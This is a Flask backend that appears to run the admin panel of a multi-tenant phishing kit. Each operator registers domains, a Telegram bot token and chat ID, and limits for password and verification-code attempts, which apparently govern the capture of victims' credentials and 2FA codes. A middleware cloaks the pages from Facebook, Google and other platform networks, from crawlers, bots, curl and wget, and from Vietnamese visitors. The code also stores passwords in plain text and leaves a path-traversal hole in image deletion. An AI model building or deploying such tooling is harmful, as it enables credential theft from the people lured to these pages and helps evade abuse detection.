import json
import os
import random
import re
import secrets
import sqlite3
import string
from functools import wraps
from json.decoder import JSONDecodeError
import json
import functools
import subprocess
from typing import List, Optional
from flask import request, jsonify
import jwt
import pytz
import requests
from flask import (Flask, config, jsonify, redirect, render_template, request,
                   send_from_directory)
from flask_cors import CORS
from requests.exceptions import RequestException
from werkzeug.utils import secure_filename
from datetime import datetime
from ipaddress import ip_address, IPv4Address
import aiohttp
import asyncio

app = Flask(__name__, static_folder="dist", template_folder="dist")
CORS(app)

UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER


def generate_or_load_secret_key():
    key_file = "secret.key"
    try:
        with open(key_file, "rb") as f:
            return f.read()
    except FileNotFoundError:
        key = secrets.token_bytes(32)
        with open(key_file, "wb") as f:
            f.write(key)
        return key


ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}
SECRET_KEY = generate_or_load_secret_key()
PUBLIC_IP = requests.get("https://api.ipify.org").text
ALLOWED_IPS = {'127.0.0.1', 'localhost', PUBLIC_IP}
DEFAULT_VALUE = "Không có"
ACCESS_DENIED_MESSAGE = "Không có quyền truy cập"
SUCCESS_MESSAGE = "Thành công"
INDEX_TEMPLATE = "index.html"


class Database:
    def __init__(self):
        self.database_path = 'database.db'
        self.setup_database()

    def get_connection(self):
        return sqlite3.connect(self.database_path)

    def setup_database(self):
        with self.get_connection() as conn:
            conn.execute('''CREATE TABLE IF NOT EXISTS list_vps (
                name TEXT PRIMARY KEY NOT NULL,
                domain_list TEXT NOT NULL,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                chat_id TEXT NOT NULL,
                token TEXT NOT NULL,
                code_loading_time INTEGER NOT NULL,
                pass_loading_time INTEGER NOT NULL,
                max_pass_attempts INTEGER NOT NULL,
                max_code_attempts INTEGER NOT NULL
                );''')
            domain_list = '[]'
            default_vps = [
                ('admin', f'{domain_list}', 'admin',
                 'admin', '', '', 10, 10, 10, 10)
            ]
            conn.executemany(
                'INSERT OR IGNORE INTO list_vps VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)', default_vps)
            conn.commit()

    def is_correct_domain(self, domain):
        with self.get_connection() as conn:
            domain_extract = conn.execute(
                'SELECT domain_list FROM list_vps WHERE domain_list LIKE ?', ('%' + domain + '%',)).fetchall()
            if len(domain_extract) > 0:
                data = json.loads(domain_extract[0][0])
                return domain in data
            return False

    def get_my_domain_list(self, name):
        with self.get_connection() as conn:
            domain_extract = conn.execute(
                'SELECT domain_list FROM list_vps WHERE name = ?', (name,)).fetchone()
            return json.loads(domain_extract[0]) if domain_extract else []

    def add_domain(self, name, domain):
        with self.get_connection() as conn:
            domain_list = self.get_my_domain_list(name)
            domain_list.append(domain)
            conn.execute(
                'UPDATE list_vps SET domain_list = ? WHERE name = ?', (json.dumps(domain_list), name))
            conn.commit()

    def delete_domain(self, name, domain):
        with self.get_connection() as conn:
            domain_list = self.get_my_domain_list(name)
            domain_list.remove(domain)
            conn.execute(
                'UPDATE list_vps SET domain_list = ? WHERE name = ?', (json.dumps(domain_list), name))
            conn.commit()

    def update_domain(self, name, old_domain, new_domain):
        with self.get_connection() as conn:
            domain_list = self.get_my_domain_list(name)
            domain_list[domain_list.index(old_domain)] = new_domain
            conn.execute(
                'UPDATE list_vps SET domain_list = ? WHERE name = ?', (json.dumps(domain_list), name))
            conn.commit()

    def get_telegram_config(self, name):
        with self.get_connection() as conn:
            return conn.execute(
                'SELECT chat_id, token FROM list_vps WHERE name = ?', (name,)).fetchone()

    def set_telegram_config(self, name, chat_id, token):
        with self.get_connection() as conn:
            conn.execute(
                'UPDATE list_vps SET chat_id = ?, token = ? WHERE name = ?', (chat_id, token, name))
            conn.commit()

    def get_config_by_domain(self, domain):
        with self.get_connection() as conn:
            result = conn.execute(
                'SELECT chat_id, token, code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts FROM list_vps WHERE domain_list LIKE ?', ('%' + domain + '%',)).fetchone()
            return result or {'chat_id': '', 'token': '', 'code_loading_time': 10,
                              'pass_loading_time': 10, 'max_pass_attempts': 10, 'max_code_attempts': 10}

    def get_config(self, name):
        with self.get_connection() as conn:
            return conn.execute(
                'SELECT chat_id, token, code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts FROM list_vps WHERE name = ?', (name,)).fetchone()

    def set_config(self, name, code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts):
        with self.get_connection() as conn:
            conn.execute(
                'UPDATE list_vps SET code_loading_time = ?, pass_loading_time = ?, max_pass_attempts = ?, max_code_attempts = ? WHERE name = ?', (code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts, name))
            conn.commit()

    def get_info(self, name):
        with self.get_connection() as conn:
            return conn.execute(
                'SELECT username, password FROM list_vps WHERE name = ?', (name,)).fetchone()

    def change_info(self, name, username, new_password):
        with self.get_connection() as conn:
            conn.execute(
                'UPDATE list_vps SET username = ?, password = ? WHERE name = ?', (username, new_password, name))
            conn.commit()

    def add_user(self, name):
        with self.get_connection() as conn:
            count_user = conn.execute(
                'SELECT COUNT(*) FROM list_vps WHERE name = ?', (name,)).fetchone()[0]
            if count_user > 0:
                return
            username = ''.join(random.choices(
                string.ascii_letters + string.digits, k=5))
            password = ''.join(random.choices(
                string.ascii_letters + string.digits, k=8))
            conn.execute(
                '''INSERT OR IGNORE INTO list_vps
                (name, domain_list, username, password, chat_id, token,
                code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                (name, '[]', username, password, '', '', 10, 10, 10, 10))
            conn.commit()

    def delete_user(self, name):
        with self.get_connection() as conn:
            conn.execute(
                'DELETE FROM list_vps WHERE name = ?', (name,))
            conn.commit()

    def get_list_user(self, name):
        with self.get_connection() as conn:
            if name == 'admin':
                return conn.execute(
                    'SELECT name, username, password FROM list_vps WHERE name != ?', ('admin',)).fetchall()
            else:
                return '[]'

    def get_name(self, username):
        with self.get_connection() as conn:
            return conn.execute(
                'SELECT name FROM list_vps WHERE username = ?', (username,)).fetchone()[0]

    def login_user(self, username, password):
        with self.get_connection() as conn:
            result = conn.execute(
                'SELECT 1 FROM list_vps WHERE username = ? AND password = ?',
                (username, password)
            ).fetchone()
            return result is not None


db = Database()


def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization")
        if not token:
            return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
        try:
            jwt.decode(token.split()[1], SECRET_KEY, algorithms=["HS256"])
        except jwt.ExpiredSignatureError:
            return jsonify({"message": ACCESS_DENIED_MESSAGE}), 401
        except jwt.InvalidTokenError:
            return jsonify({"message": ACCESS_DENIED_MESSAGE}), 401
        return f(*args, **kwargs)

    return decorated


def check_ip_middleware(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        host = request.headers.get("Host", "").split(":")[0].strip()
        if host in ALLOWED_IPS:
            return f(*args, **kwargs)
        ip = (
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.headers.get('X-Real-IP') or
            request.remote_addr
        )
        try:
            ip_obj = ip_address(ip)
            if not isinstance(ip_obj, IPv4Address):
                return jsonify({'error': 'Invalid IP format'}), 403
        except ValueError:
            return jsonify({'error': 'Invalid IP format'}), 403
        blocked_asns: List[int] = [
            15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814,
            14061, 214961, 401115, 135377, 60068, 55720, 397373,
            208312, 63949, 210644, 6939, 209, 51396
        ]
        blocked_ips: List[str] = ['95.214.55.43', '154.213.184.3']
        blocked_user_agents: List[str] = [
            'facebook', 'http', '.com', 'bot', 'python', 'botpoke',
            'crawler', 'spider', 'wget', 'curl'
        ]
        blocked_countries: List[str] = ['VN']
        user_agent: str = request.headers.get('User-Agent', '').lower()
        if any(ua in user_agent for ua in blocked_user_agents):
            return jsonify({'error': 'Forbidden'}), 403
        if ip in blocked_ips:
            return jsonify({'error': 'Forbidden'}), 403
        try:
            async def get_geo_data():
                async with aiohttp.ClientSession() as session:
                    async with session.get(f'https://get.geojs.io/v1/ip/geo/{ip.strip()}.json') as response:
                        return await response.json()

            geo_data = asyncio.run(get_geo_data())
            country: Optional[str] = geo_data.get('country')
            if country and country.upper() in blocked_countries:
                return jsonify({'error': 'Forbidden'}), 403
            asn: Optional[str] = geo_data.get('asn')
            if asn:
                try:
                    asn_num = int(asn)
                    if asn_num in blocked_asns:
                        return jsonify({'error': 'Forbidden'}), 403
                except ValueError:
                    pass

            return f(*args, **kwargs)

        except Exception as e:
            print(f"Error checking IP {ip}: {str(e)}")
            return jsonify({'error': 'Forbidden'}), 403

    return decorated_function


@app.before_request
@check_ip_middleware
def before_request():
    pass


@app.route("/api/admin/login", methods=["POST"])
def login():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    if db.login_user(username, password):
        name = db.get_name(username)
        token = jwt.encode({"user": username, "name": name},
                           SECRET_KEY, algorithm="HS256")
        return jsonify({"success": True, "token": token})
    return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401


@app.route("/api/admin/config", methods=["GET"])
def get_config():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    print(host)
    if host == 'localhost' or host == '127.0.0.1':
        host = PUBLIC_IP
        config = db.get_config_by_domain("127.0.0.1")
        return jsonify(config)
    if host not in ALLOWED_IPS:
        if not db.is_correct_domain(host):
            return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
        config = db.get_config_by_domain(host)
        return jsonify(config)
    token = request.headers.get("Authorization")
    if not token:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 403
    try:
        name = jwt.decode(token.split()[1], SECRET_KEY,
                          algorithms=["HS256"])["name"]
    except jwt.ExpiredSignatureError:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    except jwt.InvalidTokenError:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    config = db.get_config(name)
    return jsonify(config)


@app.route("/api/admin/telegram", methods=["POST"])
@token_required
def get_telegram_config():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    data = request.get_json()
    chat_id = data.get("chat_id")
    telegram_token = data.get("token")
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    db.set_telegram_config(name, chat_id, telegram_token)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.route("/api/admin/config", methods=["POST"])
@token_required
def update_config():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    try:
        new_config = request.get_json()
        token = request.headers.get("Authorization")
        name = jwt.decode(token.split()[1], SECRET_KEY,
                          algorithms=["HS256"])["name"]
        code_loading_time = new_config.get("code_loading_time")
        pass_loading_time = new_config.get("pass_loading_time")
        max_pass_attempts = new_config.get("max_pass_attempts")
        max_code_attempts = new_config.get("max_code_attempts")
        db.set_config(name, code_loading_time, pass_loading_time,
                      max_pass_attempts, max_code_attempts)
        return jsonify({"success": True, "message": SUCCESS_MESSAGE})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500


@app.route('/api/admin/domains', methods=['GET'])
@token_required
def get_domains():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    return jsonify(db.get_my_domain_list(name))


@app.route('/api/admin/add-domain', methods=['POST'])
@token_required
def add_domain():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    domain = request.get_json().get("domain")
    if not domain:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 400
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    db.add_domain(name, domain)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.route('/api/admin/delete-domain', methods=['POST'])
@token_required
def delete_domain():
    domain = request.get_json().get("domain")
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    if not domain:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 400
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    db.delete_domain(name, domain)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.route('/api/admin/change-password', methods=['POST'])
@token_required
def change_password():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    vps_name = request.get_json().get("name", None)
    username = request.get_json().get("username")
    password = request.get_json().get("password")
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name != 'admin':
        db.change_info(name, username, password)
    else:
        if vps_name:
            db.change_info(vps_name, username, password)
        else:
            db.change_info(name, username, password)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.route('/api/admin/get-info', methods=['POST'])
@token_required
def get_info():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    vps_name = request.get_json().get("name", None)
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name == 'admin':
        return jsonify(db.get_info(vps_name))
    return jsonify({'name': name})


@app.route('/api/admin/check-token', methods=['POST'])
@token_required
def check_token():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name == 'admin':
        return jsonify({"success": True, "is_admin": True})
    return jsonify({"success": True, "is_admin": False})


@app.route('/api/admin/get-list-user', methods=['GET'])
@token_required
def get_list_user():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name == 'admin':
        return jsonify(db.get_list_user(name))
    return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401


@app.route('/api/admin/add-user', methods=['POST'])
@token_required
def add_user():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    vps_name = request.get_json().get("name")
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name != 'admin':
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    db.add_user(vps_name)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.route('/api/admin/delete-user', methods=['POST'])
@token_required
def delete_user():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    vps_name = request.get_json().get("name")
    if host not in ALLOWED_IPS:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name != 'admin':
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    db.delete_user(vps_name)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.errorhandler(Exception)
def handle_error(error):
    response = jsonify({"error": str(error)})
    response.status_code = 500
    return response


@app.route("/admin")
def admin():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host not in ALLOWED_IPS:
        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
    return render_template(INDEX_TEMPLATE)


@app.route("/")
def index():
    host = request.headers.get("Host", "").split(
        ":")[0].replace("/", "").replace("\\", "").strip()
    if host in ALLOWED_IPS:
        return redirect('/admin')
    if not db.is_correct_domain(host):
        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
    return render_template(INDEX_TEMPLATE)


def serve_static_or_index(path):
    if os.path.exists(os.path.join(app.static_folder, path)):
        return send_from_directory(app.static_folder, path)
    return render_template(INDEX_TEMPLATE)


@app.route("/<path:path>")
def catch_all(path):
    host = request.headers.get("Host", "").split(
        ":")[0].replace("/", "").replace("\\", "").strip()
    if host in ALLOWED_IPS:
        if os.path.exists(os.path.join(app.static_folder, path)):
            return send_from_directory(app.static_folder, path)
        if 'admin' in path:
            return render_template(INDEX_TEMPLATE)
        return redirect('/admin')

    if not db.is_correct_domain(host):
        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403

    return serve_static_or_index(path)


def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


def get_unique_filename(filename):
    vn_timezone = pytz.timezone('Asia/Ho_Chi_Minh')
    timestamp = datetime.now(vn_timezone).strftime('%H%M%S_%d%m%Y')
    _, ext = os.path.splitext(filename)
    return f"ovf_{timestamp}{ext}"


@app.route('/api/upload-image', methods=['POST'])
def upload_image():
    if 'image' not in request.files:
        return jsonify({'success': False, 'message': 'No image file provided'}), 400

    file = request.files['image']

    if file.filename == '':
        return jsonify({'success': False, 'message': 'No selected file'}), 400

    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        unique_filename = get_unique_filename(filename)
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)

        try:
            file.save(file_path)
            image_url = f"/uploads/{unique_filename}"
            return jsonify({
                'success': True,
                'message': SUCCESS_MESSAGE,
                'url': image_url
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'message': f"Error saving file: {str(e)}"
            }), 500

    return jsonify({
        'success': False,
        'message': 'File type not allowed'
    }), 400


@app.route('/uploads/<filename>')
@token_required
def uploaded_file(filename):
    if not allowed_file(filename):
        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
    try:
        host = request.headers.get("Host", "").split(
            ":")[0].replace("/", "").replace("\\", "").strip()
        if host not in ALLOWED_IPS:
            return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
        return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
    except Exception:
        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 404


@app.route('/api/delete-image', methods=['POST'])
@token_required
def delete_image():
    filename = request.get_json().get('filename')
    if not filename:
        return jsonify({'success': False, 'message': 'No filename provided'}), 400
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(file_path):
        os.remove(file_path)
        return jsonify({'success': True, 'message': SUCCESS_MESSAGE})
    return jsonify({'success': False, 'message': 'File not found'}), 404


@app.route('/api/get-all-images', methods=['GET'])
@token_required
def get_all_images():
    vn_timezone = pytz.timezone('Asia/Ho_Chi_Minh')
    images = []

    for filename in os.listdir(app.config['UPLOAD_FOLDER']):
        if allowed_file(filename):
            file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            created_time = datetime.fromtimestamp(os.path.getctime(
                file_path), vn_timezone).strftime('%H:%M:%S %d-%m-%Y')
            images.append({
                'filename': filename,
                'url': f'/uploads/{filename}',
                'created': created_time
            })

    return jsonify(images)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
